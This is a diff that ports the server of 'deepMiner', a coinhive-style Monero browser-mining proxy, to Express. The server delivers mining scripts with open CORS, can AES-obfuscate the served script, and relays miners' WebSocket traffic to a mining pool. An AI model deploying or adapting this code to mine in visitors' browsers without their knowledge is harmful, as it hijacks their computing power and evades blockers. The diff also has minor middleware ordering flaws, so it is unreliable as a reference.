@@ -1,17 +1,59 @@
-/**
- * deepMiner v2.0
- * Idea from coinhive.com
- * For any XMR pool with your wallet
- * By evil7@deePwn
- */
-
+const express = require('express');
+const app = express();
+const expressWs = require('express-ws')(app);
+const path = require('path');
+const port = process.env.PORT || 5000;
 var http = require("http"),
-    WebSocket = require("ws"),
     net = require("net"),
     fs = require("fs"),
     CryptoJS = require("crypto-js");
 
+//Route setup
 var conf = JSON.parse(fs.readFileSync(__dirname + "/config.json", "utf8"));
+
+var file = file || {};
+var fileLists = ["/miner.html", "/lib/deepMiner.min.js", "/lib/deepMiner.js", "/lib/cryptonight.js", "/lib/cryptonight.wasm"];
+for (var i = 0; i < fileLists.length; i++) {
+    var currentFile = fileLists[i];
+    if (fileLists[i].match(/\.wasm$/)) {
+        file[currentFile] = fs.readFileSync(__dirname + "/web" + currentFile, null);
+    } else {
+        file[currentFile] = fs
+            .readFileSync(__dirname + "/web" + currentFile, "utf8")
+            .replace(/%deepMiner_domain%/g, conf.domain);
+    }
+}
+
+app.use((err, req, res, next) => {
+  console.error(err);
+});
+
+app.use((req, res, next) => {
+    console.log(req.url)
+    req.url = req.url === "/" ? "/index.html" : req.url;
+    if (req.url.match(/\.min\.js/)) {
+        res.setHeader("Access-Control-Allow-Origin", "*");
+        if (conf.cryp) {
+            var randKey = rand(32);
+            file[req.url] = randKey + "#" + enAES(randKey, file[req.url]);
+        }
+        res.setHeader("Content-Type", "application/javascript");
+    } else if (req.url.match(/\.html$/)) {
+        res.setHeader("Content-Type", "text/html");
+    } else if (req.url.match(/\.wasm$/)) {
+        res.setHeader("Access-Control-Allow-Origin", "*");
+        res.setHeader("Content-Type", "application/wasm");
+    } else {
+        res.setHeader("Content-Type", "application/octet-stream");
+    }
+    res.end(file[req.url]);
+    next()
+})
+
+app.get('/', (req, res) => {
+  console.log(req.url)
+  res.sendFile(path.join(__dirname+'/web/miner.html'));
+})
 
 // crypto for AES
 function rand(n) {
@@ -33,42 +75,6 @@ function deAES(key, str) {
     var decrypt = CryptoJS.AES.decrypt(str, key);
     return decrypt.toString(CryptoJS.enc.Utf8);
 }
-
-var file = file || {};
-var fileLists = ["/miner.html", "/lib/deepMiner.min.js", "/lib/deepMiner.js", "/lib/cryptonight.js", "/lib/cryptonight.wasm"];
-for (var i = 0; i < fileLists.length; i++) {
-    var currentFile = fileLists[i];
-    if (fileLists[i].match(/\.wasm$/)) {
-        file[currentFile] = fs.readFileSync(__dirname + "/web" + currentFile, null);
-    } else {
-        file[currentFile] = fs
-            .readFileSync(__dirname + "/web" + currentFile, "utf8")
-            .replace(/%deepMiner_domain%/g, conf.domain);
-    }
-}
-
-var stats = (req, res) => {
-    req.url = req.url === "/" ? "/index.html" : req.url;
-    if (req.url.match(/\.min\.js/)) {
-        res.setHeader("Access-Control-Allow-Origin", "*");
-        if (conf.cryp) {
-            var randKey = rand(32);
-            file[req.url] = randKey + "#" + enAES(randKey, file[req.url]);
-        }
-        res.setHeader("Content-Type", "application/javascript");
-    } else if (req.url.match(/\.html$/)) {
-        res.setHeader("Content-Type", "text/html");
-        res.write(req.html);
-    } else if (req.url.match(/\.wasm$/)) {
-        res.setHeader("Access-Control-Allow-Origin", "*");
-        res.setHeader("Content-Type", "application/wasm");
-    } else {
-        res.setHeader("Content-Type", "application/octet-stream");
-    }
-    res.end(file[req.url]);
-};
-var web = http.createServer(stats);
-
 // Trans WebSocket to PoolSocket
 function ws2pool(conn, data) {
     var buf;
@@ -174,7 +180,6 @@ function pool2ws(conn, data) {
         console.warn("[!] Error: " + error.message);
     }
 }
-
 // get IP
 function getClientIp(req) {
     // In webSocket req need select the header used lowercase `req.headers["x-real-ip"]` not the `req.headers["X-Real-IP"]`. wtf...
@@ -186,65 +191,62 @@ function getClientIp(req) {
         req.connection.socket.remoteAddress;
     return theIp;
 }
-
 // Miner Proxy Srv
-var srv = new WebSocket.Server({
-    server: web,
-    path: "/proxy",
-    maxPayload: 1024
+app.ws('/proxy', function(ws, req) {
+  var conn = {
+      uid: null,
+      pid: rand(16).toString("hex"),
+      uip: getClientIp(req),
+      workerId: null,
+      found: 0,
+      accepted: 0,
+      ws: ws,
+      pl: new net.Socket()
+  };
+  var pool = conf.pool.split(":");
+  conn.pl.connect(
+      pool[1],
+      pool[0]
+  );
+  conn.ws.on("message", data => {
+      ws2pool(conn, data);
+      console.log("[>] Request: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + data + "\n");
+  });
+  conn.ws.on("error", data => {
+      console.log("[!] " + conn.uid + " ( " + conn.uip + " )" + " WebSocket " + data + "\n");
+      conn.pl.destroy();
+  });
+  conn.ws.on("close", () => {
+      console.log("[!] " + conn.uid + " ( " + conn.uip + " )" + " offline.\n");
+      conn.pl.destroy();
+  });
+  conn.pl.on("data", function(data) {
+      var linesdata = data;
+      var lines = String(linesdata).split("\n");
+      if (lines[1].length > 0) {
+          console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + lines[0] + "\n");
+          console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + lines[1] + "\n");
+          pool2ws(conn, lines[0]);
+          pool2ws(conn, lines[1]);
+      } else {
+          console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + data + "\n");
+          pool2ws(conn, data);
+      }
+  });
+  conn.pl.on("error", data => {
+      console.log("PoolSocket " + data + "\n");
+      if (conn.ws.readyState !== 3) {
+          conn.ws.close();
+      }
+  });
+  conn.pl.on("close", () => {
+      console.log("PoolSocket Closed.\n");
+      if (conn.ws.readyState !== 3) {
+          conn.ws.close();
+      }
+  });
 });
-srv.on("connection", (ws, req) => {
-    var conn = {
-        uid: null,
-        pid: rand(16).toString("hex"),
-        uip: getClientIp(req),
-        workerId: null,
-        found: 0,
-        accepted: 0,
-        ws: ws,
-        pl: new net.Socket()
-    };
-    var pool = conf.pool.split(":");
-    conn.pl.connect(
-        pool[1],
-        pool[0]
-    );
-    conn.ws.on("message", data => {
-        ws2pool(conn, data);
-        console.log("[>] Request: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + data + "\n");
-    });
-    conn.ws.on("error", data => {
-        console.log("[!] " + conn.uid + " ( " + conn.uip + " )" + " WebSocket " + data + "\n");
-        conn.pl.destroy();
-    });
-    conn.ws.on("close", () => {
-        console.log("[!] " + conn.uid + " ( " + conn.uip + " )" + " offline.\n");
-        conn.pl.destroy();
-    });
-    conn.pl.on("data", function(data) {
-        var linesdata = data;
-        var lines = String(linesdata).split("\n");
-        if (lines[1].length > 0) {
-            console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + lines[0] + "\n");
-            console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + lines[1] + "\n");
-            pool2ws(conn, lines[0]);
-            pool2ws(conn, lines[1]);
-        } else {
-            console.log("[<] Response: " + conn.uid + " ( " + conn.uip + " )" + "\n\n" + data + "\n");
-            pool2ws(conn, data);
-        }
-    });
-    conn.pl.on("error", data => {
-        console.log("PoolSocket " + data + "\n");
-        if (conn.ws.readyState !== 3) {
-            conn.ws.close();
-        }
-    });
-    conn.pl.on("close", () => {
-        console.log("PoolSocket Closed.\n");
-        if (conn.ws.readyState !== 3) {
-            conn.ws.close();
-        }
-    });
+//Start server
+app.listen(port, (req, res) => {
+  console.log(`server listening on port: ${port}`)
 });
-web.listen(conf.lport, conf.lhost);
